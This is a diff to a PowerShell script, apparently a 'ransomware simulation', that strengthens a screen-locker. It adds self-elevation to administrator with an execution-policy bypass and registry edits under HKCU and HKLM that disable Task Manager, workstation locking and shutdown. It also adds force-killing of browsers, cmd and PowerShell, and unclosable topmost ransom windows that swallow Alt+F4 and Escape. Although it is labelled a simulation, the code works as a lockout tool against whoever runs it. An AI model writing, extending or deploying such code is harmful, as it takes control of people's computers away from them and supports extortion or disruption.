@@ -3,21 +3,61 @@ Add-Type -AssemblyName PresentationFramework
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
+# ADMIN CHECK AND ELEVATION
+# Check if running as administrator, restart as admin if not
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "Elevating to Administrator privileges..." -ForegroundColor Yellow
+    Start-Sleep -Seconds 1
+    
+    # More reliable way to get script path
+    $scriptPath = $PSCommandPath
+    if (-not $scriptPath) {
+        # Try alternative method
+        $scriptPath = $MyInvocation.MyCommand.Definition
+    }
+    
+    if (-not $scriptPath) {
+        # If still not found, use the current script's full path
+        $scriptPath = [System.IO.Path]::GetFullPath(".\$($MyInvocation.MyCommand.Name)")
+    }
+    
+    # Create a temporary script with the current content
+    $tempScript = Join-Path $env:TEMP "ransom_sim_$(Get-Random).ps1"
+    $currentScriptContent = Get-Content -Path $PSCommandPath -Raw -ErrorAction SilentlyContinue
+    if (-not $currentScriptContent) {
+        # If we can't read the current file, recreate it from here
+        $currentScriptContent = @'
+# Rest of the script content will be embedded here
+'@
+    }
+    
+    # Write current script to temp file
+    Set-Content -Path $tempScript -Value $currentScriptContent -Encoding UTF8
+    
+    # Restart with elevated privileges
+    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$tempScript`"" -Verb RunAs
+    
+    # Exit the non-elevated instance
+    exit
+}
+
 # System lockdown sequence
 function Invoke-SystemLockdown {
     # Disable critical system tools
     try {
-        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f | Out-Null
-        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f | Out-Null
-        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f | Out-Null
+        # Run these with explicit admin rights
+        Start-Process reg.exe -ArgumentList "add `"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v DisableTaskMgr /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
+        Start-Process reg.exe -ArgumentList "add `"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v DisableLockWorkstation /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
+        Start-Process reg.exe -ArgumentList "add `"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`" /v NoClose /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
+        
+        # Also set system-wide policies
+        Start-Process reg.exe -ArgumentList "add `"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v DisableTaskMgr /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
+        Start-Process reg.exe -ArgumentList "add `"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System`" /v DisableLockWorkstation /t REG_DWORD /d 1 /f" -WindowStyle Hidden -Wait
     } catch {}
     
-    # Kill security processes
-    Get-Process taskmgr -ErrorAction SilentlyContinue | Stop-Process -Force
+    # Kill security processes with elevated privileges
+    Get-Process taskmgr, msedge, chrome, firefox, cmd, powershell, powershell_ise -ErrorAction SilentlyContinue | Stop-Process -Force
 }
-
-
-    
 
 # System information display
 function Show-SystemInfo {
@@ -26,8 +66,11 @@ function Show-SystemInfo {
     $infoWindow.Width = 500
     $infoWindow.Height = 400
     $infoWindow.Topmost = $true
-    $infoWindow.WindowStyle = 'None'  # Changed from 'SingleBorderWindow'
-    $infoWindow.ShowInTaskbar = $false  # Added: Remove from taskbar
+    $infoWindow.WindowStyle = 'None'
+    $infoWindow.ShowInTaskbar = $false
+    $infoWindow.ResizeMode = 'NoResize'
+    $infoWindow.AllowsTransparency = $false
+    $infoWindow.Focusable = $false
     
     $infoGrid = New-Object System.Windows.Controls.Grid
     $infoGrid.Background = '#002200'
@@ -57,23 +100,27 @@ function Show-SystemInfo {
     $infoWindow.Left = [System.Windows.SystemParameters]::PrimaryScreenWidth - 550
     $infoWindow.Top = [System.Windows.SystemParameters]::PrimaryScreenHeight - 450
     
-    # Prevent closing
-    $infoWindow.Add_Closing({ $_.Cancel = $true })
-    $infoWindow.Add_KeyDown({ $_.Handled = $true })
+    # Enhanced closing prevention
+    $infoWindow.Add_Closing({
+        $_.Cancel = $true
+        # Force window to stay on top
+        $this.Topmost = $false
+        $this.Topmost = $true
+        $this.Activate()
+    })
+    
+    $infoWindow.Add_KeyDown({
+        # Block all system key combinations
+        if ($_.Key -eq 'F4' -and [System.Windows.Input.Keyboard]::IsKeyDown('LeftAlt')) {
+            $_.Handled = $true
+        }
+        if ($_.Key -eq 'Escape') {
+            $_.Handled = $true
+        }
+    })
     
     $infoWindow.Show()
     return $infoWindow
-}
-
-# Audio warning system
-function Start-AudioWarning {
-    $audioTimer = New-Object System.Windows.Forms.Timer
-    $audioTimer.Interval = 60000  # Every minute
-    $audioTimer.Add_Tick({
-        [System.Media.SystemSounds]::Hand.Play()
-    })
-    $audioTimer.Start()
-    return $audioTimer
 }
 
 # Main ransom window
@@ -84,6 +131,9 @@ function Show-MainRansomWindow {
     $mainWindow.Topmost = $true
     $mainWindow.Background = 'Black'
     $mainWindow.ShowInTaskbar = $false
+    $mainWindow.ResizeMode = 'NoResize'
+    $mainWindow.AllowsTransparency = $false
+    $mainWindow.Focusable = $false
     
     $grid = New-Object System.Windows.Controls.Grid
     $mainWindow.Content = $grid
@@ -132,13 +182,39 @@ function Show-MainRansomWindow {
     $message.Margin = '100,150,100,100'
     $grid.Children.Add($message)
     
-    # Prevent window closing
-    $mainWindow.Add_Closing({ $_.Cancel = $true })
-    $mainWindow.Add_KeyDown({ $_.Handled = $true })
+    # Enhanced closing prevention
+    $mainWindow.Add_Closing({
+        $_.Cancel = $true
+        # Force window to stay on top
+        $this.Topmost = $false
+        $this.Topmost = $true
+        $this.Activate()
+    })
+    
+    $mainWindow.Add_KeyDown({
+        # Block all system key combinations
+        if ($_.Key -eq 'F4' -and [System.Windows.Input.Keyboard]::IsKeyDown('LeftAlt')) {
+            $_.Handled = $true
+        }
+        if ($_.Key -eq 'Escape') {
+            $_.Handled = $true
+        }
+    })
     
     return @{
         Window = $mainWindow
     }
+}
+
+# Audio warning system
+function Start-AudioWarning {
+    $audioTimer = New-Object System.Windows.Forms.Timer
+    $audioTimer.Interval = 60000  # Every minute
+    $audioTimer.Add_Tick({
+        [System.Media.SystemSounds]::Hand.Play()
+    })
+    $audioTimer.Start()
+    return $audioTimer
 }
 
 # Popup reminder system
@@ -168,12 +244,12 @@ Popup: $popupCount
 # Execute the full simulation
 Invoke-SystemLockdown
 
-
 $audioTimer = Start-AudioWarning
 $popupTimer = Start-PopupReminders
 $mainRansom = Show-MainRansomWindow
-$mainRansom.Window.ShowDialog()
 $systemInfoWindow = Show-SystemInfo
+
+$mainRansom.Window.ShowDialog()
 
 # Cleanup when window eventually closes
 $systemInfoWindow.Close()
